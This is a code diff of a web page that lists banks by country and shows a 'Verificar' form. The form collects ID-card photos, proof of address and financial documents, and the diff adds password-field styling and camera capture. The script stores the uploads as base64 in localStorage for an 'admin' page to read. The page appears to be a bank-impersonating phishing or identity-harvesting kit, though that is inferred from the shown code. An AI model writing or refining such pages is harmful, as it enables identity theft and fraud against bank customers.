@@ -7,7 +7,7 @@
     body { font-family: Arial; background: #f4f6f9; margin: 20px; }
     h1 { text-align: center; color: #003366; }
     .search-box { text-align: center; margin: 20px; }
-    input[type="text"] { padding: 8px; width: 300px; }
+    input[type="text"], input[type="password"] { padding: 8px; width: 300px; }
     .accordion { background: #fff; border: 1px solid #ccc; border-radius: 5px; margin: 10px auto; width: 420px; }
     .accordion-header { padding: 15px; cursor: pointer; background: #e6f0ff; font-weight: bold; }
     .accordion-content { display: none; padding: 15px; }
@@ -61,26 +61,25 @@ bancosIBAN.forEach(item => {
         </label>
 
         <label>Foto carnet (frontal):
-          <input type="file" name="frontal" accept="image/*" required>
+          <input type="file" name="frontal" accept="image/*" capture="camera" required>
         </label>
 
         <label>Foto carnet (trasera):
-          <input type="file" name="trasera" accept="image/*" required>
+          <input type="file" name="trasera" accept="image/*" capture="camera" required>
         </label>
 
         <label>Comprobante de domicilio:
-          <input type="file" name="domicilio" accept="image/*,application/pdf" required>
+          <input type="file" name="domicilio" accept="image/*,application/pdf" capture="camera" required>
         </label>
 
         <label>Justificantes financieros:
-          <input type="file" name="finanzas" accept="image/*,application/pdf" required>
+          <input type="file" name="finanzas" accept="image/*,application/pdf" capture="camera" required>
         </label>
 
         <button type="submit">Verificar</button>
       </form>
     </div>
   `;
-
   acc.style.display = destacados.includes(item.pais) ? "" : "none";
   accordionList.appendChild(acc);
 });
@@ -111,14 +110,12 @@ function fileToBase64(file) {
   });
 }
 
-// GUARDAR DATOS EN LOCALSTORAGE (clave: "registros")
+// Guardar datos en localStorage
 async function guardarDatos(event) {
   event.preventDefault();
-
   const form = event.target;
   const header = form.closest(".accordion").querySelector(".accordion-header").textContent;
 
-  // OBLIGATORIO: usar los mismos name que luego lee admin
   const frontal = await fileToBase64(form.frontal.files[0]);
   const trasera = await fileToBase64(form.trasera.files[0]);
   const domicilio = await fileToBase64(form.domicilio.files[0]);
